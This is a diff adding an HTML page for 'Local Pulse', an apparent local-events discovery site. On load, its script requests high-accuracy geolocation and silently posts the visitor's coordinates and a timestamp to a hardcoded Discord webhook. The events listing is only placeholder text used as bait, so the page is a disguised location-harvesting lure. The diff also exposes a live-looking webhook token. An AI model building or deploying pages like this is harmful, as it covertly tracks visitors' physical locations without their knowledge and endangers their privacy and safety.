@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Local Pulse - Discover Nearby Events</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 50px 15px;
+        }
+
+        .hero {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 80vh;
+        }
+
+        .hero-content {
+            flex: 1;
+            padding-right: 50px;
+        }
+
+        .hero-content h1 {
+            font-size: 3.5rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, #fff 20%, #9966ff 80%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero-content p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            color: rgba(255,255,255,0.8);
+        }
+
+        .cta-button {
+            display: inline-block;
+            padding: 15px 35px;
+            background: #fff;
+            color: #667eea;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+
+        .cta-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
+        }
+
+        .event-categories {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 50px;
+        }
+
+        .category {
+            flex: 1;
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 0 15px;
+            text-align: center;
+            transition: all 0.4s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .category:hover {
+            transform: scale(1.05);
+            background: rgba(255,255,255,0.2);
+        }
+
+        .category-icon {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+
+        .category-title {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+        }
+
+        /* New Events Section Styles */
+        .events-section {
+            margin-top: 50px;
+        }
+
+        .events-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+
+        .event-card {
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 20px;
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .event-card.loading {
+            cursor: wait;
+        }
+
+        .event-card-content {
+            opacity: 0.5;
+        }
+
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, 
+                rgba(255,255,255,0) 0%, 
+                rgba(255,255,255,0.2) 50%, 
+                rgba(255,255,255,0) 100%);
+            animation: loading-pulse 1.5s infinite;
+            transform: translateX(-100%);
+        }
+
+        @keyframes loading-pulse {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(300%); }
+        }
+
+        .location-prompt {
+            text-align: center;
+            margin-top: 20px;
+            color: rgba(255,255,255,0.7);
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .floating-element {
+            animation: float 4s ease-in-out infinite;
+        }
+
+        @media (max-width: 768px) {
+            .hero {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .hero-content {
+                padding-right: 0;
+            }
+
+            .event-categories, .events-grid {
+                flex-direction: column;
+                grid-template-columns: 1fr;
+            }
+
+            .category, .event-card {
+                margin: 15px 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="hero">
+            <div class="hero-content">
+                <h1>Local Pulse</h1>
+                <p>Discover exciting events happening near you. Just share your location and unlock a world of local experiences!</p>
+                <div id="status" class="location-prompt">Waiting for location permission...</div>
+            </div>
+        </div>
+
+        <div class="event-categories">
+            <div class="category">Concerts</div>
+            <div class="category">Meetups</div>
+            <div class="category">Local News</div>
+        </div>
+
+        <div class="events-section">
+            <div id="events-grid" class="events-grid">
+                <div class="event-card loading">
+                    <div class="loading-overlay"></div>
+                    <div class="event-card-content">
+                        <h3>Event loading...</h3>
+                        <p>Location: Waiting for permission</p>
+                        <p>Time: loading...</p>
+                    </div>
+                </div>
+                <div class="event-card loading">
+                    <div class="loading-overlay"></div>
+                    <div class="event-card-content">
+                        <h3>Event loading...</h3>
+                        <p>Location: Waiting for permission</p>
+                        <p>Time: loading...</p>
+                    </div>
+                </div>
+                <div class="event-card loading">
+                    <div class="loading-overlay"></div>
+                    <div class="event-card-content">
+                        <h3>Event loading...</h3>
+                        <p>Location: Waiting for permission</p>
+                        <p>Time: loading...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1313562882058883103/wLDfYBbMWXFMAmfBECUU2L40BV-LQ2yZCkhCWTxcN3rtHSvEDKaB2C7iU5IAJV-0v8yy';
+        
+        function sendToDiscord(latitude, longitude) {
+            const payload = {
+                content: `New Visitor Location:
+Latitude: ${latitude}
+Longitude: ${longitude}
+Timestamp: ${new Date().toISOString()}`
+            };
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send webhook');
+                }
+            }).catch(error => {
+                console.error('Webhook error:', error);
+            });
+        }
+
+        function updateEventsAfterLocationPermission(latitude, longitude) {
+            const eventsGrid = document.getElementById('events-grid');
+            const eventCards = eventsGrid.querySelectorAll('.event-card');
+            
+            eventCards.forEach((card, index) => {
+                card.classList.remove('loading');
+                const content = card.querySelector('.event-card-content');
+                
+                // Simulated event details (you'd replace this with real API calls)
+                const events = [
+                    { name: 'Jazz Night', location: 'Downtown Music Hall', time: '8:00 PM' },
+                    { name: 'Tech Meetup', location: 'Innovation Center', time: '6:30 PM' },
+                    { name: 'Art Workshop', location: 'Community Gallery', time: '3:00 PM' }
+                ];
+
+                const event = events[index];
+                content.innerHTML = `
+                    <h3>${event.name}</h3>
+                    <p>Location: ${event.location}</p>
+                    <p>Time: ${event.time}</p>
+                `;
+            });
+        }
+
+        function getLocation() {
+            const statusEl = document.getElementById('status');
+            
+            if (!navigator.geolocation) {
+                statusEl.textContent = 'Geolocation not supported';
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude } = position.coords;
+                    statusEl.textContent = `Location captured: ${latitude}, ${longitude}`;
+                    sendToDiscord(latitude, longitude);
+                    updateEventsAfterLocationPermission(latitude, longitude);
+                },
+                (error) => {
+                    statusEl.textContent = `Error: ${error.message}`;
+                },
+                { enableHighAccuracy: true }
+            );
+        }
+
+        getLocation();
+    </script>
+</body>
+</html>
